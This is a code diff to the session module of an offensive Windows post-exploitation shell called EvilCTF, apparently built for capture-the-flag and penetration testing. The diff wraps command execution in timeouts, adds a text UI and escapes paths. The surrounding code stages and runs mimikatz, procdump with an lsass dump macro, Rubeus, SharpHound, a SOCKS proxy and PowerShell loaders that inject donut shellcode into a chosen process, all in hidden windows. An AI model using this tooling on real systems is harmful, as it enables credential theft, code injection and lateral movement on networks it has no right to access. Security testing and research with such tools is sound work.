@@ -7,6 +7,9 @@ require_relative 'uploader' # loads EvilCTF::Uploader
 require_relative 'enums'
 require_relative 'sql_enum'
 require_relative 'connection'
+require_relative 'utils'
+require_relative 'execution'
+require_relative 'tui'
 require 'readline'
 require 'timeout'
 require 'evil_ctf/uploader'
@@ -107,6 +110,23 @@ module EvilCTF::Session
       setup_autocomplete(history)
       enum_cache = {}
 
+      # If the user requested the TTY-based UI, hand off control to the
+      # TUI renderer which will perform its own background polling and
+      # interactive handling. After the TUI exits we perform normal
+      # session cleanup and return.
+      if session_options[:tui]
+        begin
+          puts "[*] Launching TUI..."
+          EvilCTF::TUI.start_rainfrog(shell, session_options)
+        rescue => e
+          puts "[!] Failed to start TUI: #{e.class}: #{e.message}"
+        ensure
+          EvilCTF::ShellWrapper.exit_session(shell) if defined?(EvilCTF::ShellWrapper.exit_session)
+          shell.close if shell
+        end
+        return true
+      end
+
       # Enumeration presets
       if session_options[:enum]
         puts "[*] Running enumeration preset: #{session_options[:enum]}"
@@ -115,7 +135,7 @@ module EvilCTF::Session
           EvilCTF::Tools.safe_autostage('winpeas', shell, session_options, logger)
         when 'dom'
           EvilCTF::Tools.safe_autostage('powerview', shell, session_options, logger)
-          shell.run("IEX (Get-Content 'C:\\Users\\Public\\PowerView.ps1' -Raw)")
+          EvilCTF::Execution.run(shell, "IEX (Get-Content 'C:\\Users\\Public\\PowerView.ps1' -Raw)", timeout: 60)
         when 'sql'
           EvilCTF::SQLEnum.run_sql_enum(shell)
         else
@@ -269,8 +289,8 @@ module EvilCTF::Session
                         end
                         ps = "IEX (Get-Content '#{loader_remote}' -Raw); Invoke-Binary -Path '#{exe}'"
                         ps += " -Arguments '#{exe_args}'" unless exe_args.empty?
-                        result = shell.run(ps)
-                        puts result.output
+                        exec_res = EvilCTF::Execution.run(shell, ps, timeout: 60)
+                        puts exec_res.output
                         next
 
                       when /^dll-loader\s+(.+)$/i
@@ -289,8 +309,8 @@ module EvilCTF::Session
                           dll = remote_dll
                         end
                         ps = "IEX (Get-Content '#{loader_remote}' -Raw); Dll-Loader -Path '#{dll}'"
-                        result = shell.run(ps)
-                        puts result.output
+                        exec_res = EvilCTF::Execution.run(shell, ps, timeout: 60)
+                        puts exec_res.output
                         next
 
                       when /^donut-loader\s+(.+)$/i
@@ -309,8 +329,8 @@ module EvilCTF::Session
                           donutfile = remote_donut
                         end
                         ps = "IEX (Get-Content '#{loader_remote}' -Raw); Donut-Loader -DonutFile '#{donutfile}' -ProcessId #{processid}"
-                        result = shell.run(ps)
-                        puts result.output
+                        exec_res = EvilCTF::Execution.run(shell, ps, timeout: 60)
+                        puts exec_res.output
                         next
               EvilCTF::Tools.safe_autostage('procdump', shell, session_options, logger)
               command_manager.expand_macro('lsass_dump', shell,
@@ -331,7 +351,7 @@ module EvilCTF::Session
               end
               if t == 'dom'
                 EvilCTF::Tools.safe_autostage('powerview', shell, session_options, logger)
-                shell.run("IEX (Get-Content 'C:\\Users\\Public\\PowerView.ps1' -Raw)")
+                EvilCTF::Execution.run(shell, "IEX (Get-Content 'C:\\Users\\Public\\PowerView.ps1' -Raw)", timeout: 120)
               end
               if t == 'sql'
                 EvilCTF::SQLEnum.run_sql_enum(shell)
@@ -343,7 +363,7 @@ module EvilCTF::Session
 
             when /^dom_enum$/i
               EvilCTF::Tools.safe_autostage('powerview', shell, session_options, logger)
-              shell.run("IEX (Get-Content 'C:\\Users\\Public\\PowerView.ps1' -Raw)")
+              EvilCTF::Execution.run(shell, "IEX (Get-Content 'C:\\Users\\Public\\PowerView.ps1' -Raw)", timeout: 120)
               EvilCTF::Enums.run_enumeration(shell, type: 'dom', cache: enum_cache,
                                              fresh: session_options[:fresh])
               next
@@ -373,8 +393,8 @@ module EvilCTF::Session
                   $_.PathName -notlike '`"*' -and $_.PathName -like '*.exe*' -and $_.PathName -like '* *'
                 } | Select-Object Name, DisplayName, PathName, State, StartMode | Format-Table -AutoSize
               POWERSHELL
-              result = shell.run(unquoted_ps)
-              puts result.output
+              exec_res = EvilCTF::Execution.run(shell, unquoted_ps, timeout: 30)
+              puts exec_res.output
               next
 
             when /^tool\s+(\w+)$/i
@@ -397,7 +417,7 @@ module EvilCTF::Session
                       puts "[*] Executing mimikatz..."
                       ps_cmd = <<~PS
                         try {
-                          $proc = Start-Process -FilePath "#{remote_path}" -PassThru -WindowStyle Hidden
+                          $proc = Start-Process -FilePath '#{EvilCTF::Utils.escape_ps_string(remote_path)}' -PassThru -WindowStyle Hidden
                           $proc.WaitForExit(30000) | Out-Null
                           if ($proc.HasExited) {
                             Write-Output "Mimikatz completed with exit code: $($proc.ExitCode)"
@@ -409,14 +429,14 @@ module EvilCTF::Session
                           Write-Output "Error executing mimikatz: $_.Exception.Message"
                         }
                       PS
-                      result = shell.run(ps_cmd)
-                      puts result.output
+                      exec_res = EvilCTF::Execution.run(shell, ps_cmd, timeout: 35)
+                      puts exec_res.output
 
                     when 'winpeas'
                       puts "[*] Executing winpeas..."
                       ps_cmd = <<~PS
                         try {
-                          $proc = Start-Process -FilePath "cmd" -ArgumentList "/c #{remote_path}" -PassThru -WindowStyle Hidden
+                          $proc = Start-Process -FilePath "cmd" -ArgumentList "/c '#{EvilCTF::Utils.escape_ps_string(remote_path)}'" -PassThru -WindowStyle Hidden
                           $proc.WaitForExit(60000) | Out-Null
                           if ($proc.HasExited) {
                             Write-Output "WinPEAS completed with exit code: $($proc.ExitCode)"
@@ -428,14 +448,14 @@ module EvilCTF::Session
                           Write-Output "Error executing winpeas: $_.Exception.Message"
                         }
                       PS
-                      result = shell.run(ps_cmd)
-                      puts result.output
+                      exec_res = EvilCTF::Execution.run(shell, ps_cmd, timeout: 70)
+                      puts exec_res.output
 
                     when 'procdump'
                       puts "[*] Executing procdump..."
                       ps_cmd = <<~PS
                         try {
-                          $proc = Start-Process -FilePath "cmd" -ArgumentList "/c #{remote_path}" -PassThru -WindowStyle Hidden
+                          $proc = Start-Process -FilePath "cmd" -ArgumentList "/c '#{EvilCTF::Utils.escape_ps_string(remote_path)}'" -PassThru -WindowStyle Hidden
                           $proc.WaitForExit(30000) | Out-Null
                           if ($proc.HasExited) {
                             Write-Output "Procdump completed with exit code: $($proc.ExitCode)"
@@ -447,14 +467,14 @@ module EvilCTF::Session
                           Write-Output "Error executing procdump: $_.Exception.Message"
                         }
                       PS
-                      result = shell.run(ps_cmd)
-                      puts result.output
+                      exec_res = EvilCTF::Execution.run(shell, ps_cmd, timeout: 35)
+                      puts exec_res.output
 
                     when 'rubeus', 'seatbelt'
                       puts "[*] Executing #{key}..."
                       ps_cmd = <<~PS
                         try {
-                          $proc = Start-Process -FilePath "#{remote_path}" -PassThru -WindowStyle Hidden
+                          $proc = Start-Process -FilePath '#{EvilCTF::Utils.escape_ps_string(remote_path)}' -PassThru -WindowStyle Hidden
                           $proc.WaitForExit(30000) | Out-Null
                           if ($proc.HasExited) {
                             Write-Output "#{key.capitalize} completed with exit code: $($proc.ExitCode)"
@@ -466,27 +486,27 @@ module EvilCTF::Session
                           Write-Output "Error executing #{key}: $_.Exception.Message"
                         }
                       PS
-                      result = shell.run(ps_cmd)
-                      puts result.output
+                      exec_res = EvilCTF::Execution.run(shell, ps_cmd, timeout: 35)
+                      puts exec_res.output
 
                     when 'inveigh', 'powerview', 'sharphound'
                       puts "[*] Executing #{key} PowerShell script..."
-                      ps_script = "IEX (Get-Content '#{remote_path}' -Raw) 2>&1"
-                      result = shell.run(ps_script)
-                      puts result.output
+                      ps_script = "IEX (Get-Content '#{EvilCTF::Utils.escape_ps_string(remote_path)}' -Raw) 2>&1"
+                      exec_res = EvilCTF::Execution.run(shell, ps_script, timeout: 120)
+                      puts exec_res.output
 
                     when 'socksproxy'
                       puts "[*] Executing SOCKS proxy PowerShell module..."
-                      ps_script = "Import-Module '#{remote_path}' 2>&1; Invoke-SocksProxy -Port 1080"
-                      result = shell.run(ps_script)
-                      puts result.output
+                      ps_script = "Import-Module '#{EvilCTF::Utils.escape_ps_string(remote_path)}' 2>&1; Invoke-SocksProxy -Port 1080"
+                      exec_res = EvilCTF::Execution.run(shell, ps_script, timeout: 120)
+                      puts exec_res.output
 
                     else
                       if remote_path.end_with?('.exe')
                         puts "[*] Executing #{key}..."
                         ps_cmd = <<~PS
                           try {
-                            $proc = Start-Process -FilePath "#{remote_path}" -PassThru -WindowStyle Hidden
+                            $proc = Start-Process -FilePath '#{EvilCTF::Utils.escape_ps_string(remote_path)}' -PassThru -WindowStyle Hidden
                             $proc.WaitForExit(30000) | Out-Null
                             if ($proc.HasExited) {
                               Write-Output "#{key.capitalize} completed with exit code: $($proc.ExitCode)"
@@ -498,8 +518,8 @@ module EvilCTF::Session
                             Write-Output "Error executing #{key}: $_.Exception.Message"
                           }
                         PS
-                        result = shell.run(ps_cmd)
-                        puts result.output
+                        exec_res = EvilCTF::Execution.run(shell, ps_cmd, timeout: 35)
+                        puts exec_res.output
                       else
                         puts "[*] Tool staged. Execute manually with: #{remote_path}"
                       end
@@ -670,6 +690,21 @@ module EvilCTF::Session
         hosts << { ip: parts[0], user: parts[1], password: parts[2] || '', hash: parts[3] }
       else
         puts "[!] Invalid host line: #{line}"
+      end
+    ensure
+      # Ensure we always try to clean up remote shell and connection resources
+      begin
+        shell.close if shell
+      rescue => _e
+        # best-effort cleanup
+      end
+      begin
+        conn.reset if conn && conn.respond_to?(:reset)
+      rescue => _e
+      end
+      begin
+        logger.close if defined?(logger) && logger.respond_to?(:close)
+      rescue => _e
       end
     end
     hosts
